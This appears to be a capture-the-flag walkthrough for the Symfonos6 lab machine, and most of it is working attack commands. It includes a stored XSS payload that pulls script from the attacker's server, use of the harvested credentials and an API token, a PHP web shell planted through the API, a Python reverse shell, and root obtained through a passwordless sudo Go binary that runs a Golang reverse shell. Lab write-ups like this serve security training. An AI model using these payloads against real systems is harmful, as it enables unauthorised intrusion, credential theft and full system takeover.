# SYMFONOS6

## BASIC INFO 
```
export IP=10.10.179.204
```

Using big.txt from seclists
Found /flyspray

Create a user test, then comment on one of the post.
Next change real name to below.
`"><script SRC=http://10.11.7.208:8000/flyspray.js/>`

... and on our host machine set up a python server with `python3 -m http.server` which contains [flyspray.js](flyspray.js). Wait until the admin open the page, which we can see there's a GET request on our server, then log in with `hacker:12345678`

Now a second post is created with the credentials.
achilles:h2sBr9gryBunKdF9

Log in to `http://10.10.179.204:5000` and look at the source code. We can see that it has an api which construct to the following url.`http://10.10.179.204:5000/ls2o4g/v1.0/` with 3 method `ping`, `auth` and `posts`

Running the command
```bash
curl -s -L -X POST "http://10.10.179.204:5000/ls2o4g/v1.0/auth/login" -H 'Content-Type: application/json' --data-raw '{"username": "achilles", "password" : "h2sBr9gryBunKdF9" }'
```

... we got the output
```
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1OTExNzgzNzEsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.MUCkKBlpUkyEQHPyK6h9oZpOf7aFYE3mYbpbgbJqHcM","user":{"display_name":"achilles","id":1,"username":"achilles"}}
```
... which decodes to
```
{
  "exp": 1591178371,
  "user": {
    "display_name": "achilles",
    "id": 1,
    "username": "achilles"
  }
}
```

So that we know we got a valid token, we can try to post to the page with the token and inject our code into it.

```bash
TOKEN=$(curl -s -L -X POST "http://10.10.179.204:5000/ls2o4g/v1.0/auth/login" -H 'Content-Type: application/json' --data-raw '{"username": "achilles", "password" : "h2sBr9gryBunKdF9" }' | jq -r '.token')
curl -L -X POST "http://10.10.179.204:5000/ls2o4g/v1.0/posts" -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" --data-raw '{"text": "system($_GET['cmd']);" }'
```

This will post to the api and inject it with a variable `cmd` whichwe can then control.

Now we define our reverse shell.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.7.208",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Set up a listener on our host machine then navigate to the page `http://10.10.179.204/posts/?cmd=<reverse shell>` and we got a shell.

Once we're in we can then `su` to achilles with the credentials we get before. Running `sudo -l` shows that we can run `sudo /usr/local/go/bin/go` without password. Go to payload all the things and search for reverse shell on Golang.

Set up another listener on our machine, then run the following command.
```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.11.7.208:9002");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && sudo /usr/local/go/bin/go run /tmp/t.go && rm /tmp/t.go
```

> - **Initial version**
>> 1.0-rc4

> - **wc -c proof.txt**
>> 592